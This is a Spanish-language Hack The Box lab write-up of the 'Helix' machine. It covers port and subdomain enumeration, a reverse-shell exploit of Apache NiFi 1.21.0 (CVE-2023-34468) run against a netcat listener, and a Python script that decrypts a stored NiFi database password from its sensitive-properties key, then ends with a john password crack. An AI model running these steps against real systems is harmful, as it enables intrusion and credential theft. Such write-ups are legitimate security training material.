@@ -1,0 +1,204 @@
+---
+type: writeup
+title: Helix
+description: ""
+lang: es
+draft: false
+image: ../../../../images/writeups/hackthebox/machines/helix/helix.png
+platform: hackthebox
+url: https://app.hackthebox.com/machines/Helix
+difficulty: medium
+os: linux
+hints: []
+tags: []
+---
+
+## Enumeration
+
+Escaneamos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 10.129.99.140
+```
+
+```plaintext
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+```
+
+Escaneamos los puertos abiertos para conocer más detalles de los servicios que corren en ellos.
+
+```bash
+nmap -p 22,80 -sCV -oA nmap/openports 10.129.99.140
+```
+
+```plaintext
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
+|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://helix.htb/
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
+
+Agregamos el dominio `helix.htb` al archivo `/etc/hosts`.
+
+```bash
+echo '10.129.99.140 helix.htb' | sudo tee -a /etc/hosts
+```
+
+Enumeramos subdominios.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://helix.htb/ -H 'Host: FUZZ.helix.htb' -ic -c -t 100 -fs 154
+```
+
+```plaintext
+flow                    [Status: 200, Size: 1068, Words: 110, Lines: 28, Duration: 243ms]
+```
+
+Agregamos el subdominio `flow.helix.htb` al archivo `/etc/hosts`.
+
+Enumeramos directorios.
+
+```bash
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -u http://flow.helix.htb/nifi/FUZZ -ic -c -t 100
+```
+
+```plaintext
+images                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 282ms]
+login                   [Status: 200, Size: 4066, Words: 701, Lines: 92, Duration: 423ms]
+                        [Status: 200, Size: 212053, Words: 70057, Lines: 3943, Duration: 247ms]
+templates               [Status: 200, Size: 5842, Words: 886, Lines: 111, Duration: 627ms]
+history                 [Status: 200, Size: 10116, Words: 2326, Lines: 212, Duration: 384ms]
+users                   [Status: 200, Size: 8597, Words: 1503, Lines: 170, Duration: 382ms]
+assets                  [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 252ms]
+css                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 239ms]
+js                      [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 230ms]
+summary                 [Status: 200, Size: 47829, Words: 16938, Lines: 882, Duration: 248ms]
+message                 [Status: 200, Size: 1855, Words: 484, Lines: 44, Duration: 353ms]
+fonts                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 231ms]
+views                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 231ms]
+cluster                 [Status: 200, Size: 7915, Words: 1403, Lines: 162, Duration: 543ms]
+canvas                  [Status: 200, Size: 212053, Words: 70057, Lines: 3943, Duration: 251ms]
+counters                [Status: 200, Size: 5765, Words: 880, Lines: 109, Duration: 302ms]
+                        [Status: 200, Size: 212053, Words: 70057, Lines: 3943, Duration: 241ms]
+bulletin-board          [Status: 200, Size: 5854, Words: 849, Lines: 109, Duration: 2009ms]
+```
+
+Visitamos el subdominio y nos encontramos con la versión **nifi-1.21.0-RC2**.
+
+![Subdomain Apache Nifi](@images/writeups/hackthebox/machines/helix/helix-subdomain-nifi.png)
+
+Esta versión es vulnerable a una ejecución de código ([https://nvd.nist.gov/vuln/detail/cve-2023-34468](https://nvd.nist.gov/vuln/detail/cve-2023-34468)).
+
+El siguiente POC permite automatizar el proceso [CVE-2023-34468 — Apache NiFi 1.21.0 RCE PoC](https://github.com/sbouabid-sec/CVE-2023-34468-POC).
+
+Nos ponemos en escucha en la máquina atacante.
+
+```bash
+nc -lnvp 1111
+```
+
+```bash
+sudo python3 exploit.py --target http://flow.helix.htb --lhost 10.10.15.177 --lport 1111
+```
+
+Estabilizamos la reverse shell.
+
+`/opt/nifi-1.21.0/conf/nifi.properties`
+
+```
+# security properties #
+nifi.sensitive.props.key=TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl
+nifi.sensitive.props.key.protected=
+nifi.sensitive.props.algorithm=NIFI_PBKDF2_AES_GCM_256
+nifi.sensitive.props.additional.keys=
+```
+
+```
+nifi@helix:/opt/nifi-1.21.0/conf$ zgrep -i "enc{" flow.xml.gz
+        <value>enc{1d6e24aee414340e5f6bd593f1eee0e6e700626ab8d7570597713a05461868413224bd371f4a987aa46d4e6ff814074f67d9}</value>
+```
+
+```python
+import hashlib
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+
+password = b"TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl"
+salt = b"NiFi Static Salt"
+iterations = 160000
+
+key = hashlib.pbkdf2_hmac('sha512', password, salt, iterations, 32)
+
+cipher_hex = "1d6e24aee414340e5f6bd593f1eee0e6e700626ab8d7570597713a05461868413224bd371f4a987aa46d4e6ff814074f67d9"
+binary_data = bytes.fromhex(cipher_hex)
+
+iv = binary_data[:16]
+ciphertext_with_tag = binary_data[16:]
+ciphertext = ciphertext_with_tag[:-16]
+tag = ciphertext_with_tag[-16:]
+
+try:
+    cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag))
+    decryptor = cipher.decryptor()
+    plaintext = decryptor.update(ciphertext) + decryptor.finalize()
+    print(f"Decrypted credential: {plaintext.decode('utf-8')}")
+except Exception as e:
+    print(f"Error: {e}")
+```
+
+```bash
+python3 decipher.py 
+Decrypted credential: R7qZ9L3xKM2W8pFYcA
+```
+
+```
+nifi@helix:/opt/nifi-1.21.0/conf$ zgrep -B 15 -A 5 "1d6e24aee414340e5f6bd593f1eee0e6e700626ab8d7570597713a05461868413224bd371f4a987aa46d4e6ff814074f67d9" flow.xml.gz
+      <property>
+        <name>kerberos-credentials-service</name>
+      </property>
+      <property>
+        <name>kerberos-principal</name>
+      </property>
+      <property>
+        <name>kerberos-password</name>
+      </property>
+      <property>
+        <name>Database User</name>
+        <value>operator</value>
+      </property>
+      <property>
+        <name>Password</name>
+        <value>enc{1d6e24aee414340e5f6bd593f1eee0e6e700626ab8d7570597713a05461868413224bd371f4a987aa46d4e6ff814074f67d9}</value>
+      </property>
+      <property>
+        <name>Max Wait Time</name>
+        <value>500 millis</value>
+      </property>
+```
+
+```
+ss -tulnp
+Netid           State            Recv-Q           Send-Q                           Local Address:Port                        Peer Address:Port           Process           
+udp             UNCONN           0                0                                127.0.0.53%lo:53                               0.0.0.0:*                                
+udp             UNCONN           0                0                                      0.0.0.0:68                               0.0.0.0:*                                
+tcp             LISTEN           0                50                                   127.0.0.1:8080                             0.0.0.0:*                                
+tcp             LISTEN           0                50                                   127.0.0.1:46371                            0.0.0.0:*                                
+tcp             LISTEN           0                511                                    0.0.0.0:80                               0.0.0.0:*                                
+tcp             LISTEN           0                128                                    0.0.0.0:22                               0.0.0.0:*                                
+tcp             LISTEN           0                4096                             127.0.0.53%lo:53                               0.0.0.0:*                                
+tcp             LISTEN           0                50                          [::ffff:127.0.0.1]:38049                                  *:*                                
+tcp             LISTEN           0                128                                       [::]:22                                  [::]:* 
+```
+
+```
+john hash.txt --show
+Operator Control & Safety Guide.pdf:operator1
+
+1 password hash cracked, 0 left
+```
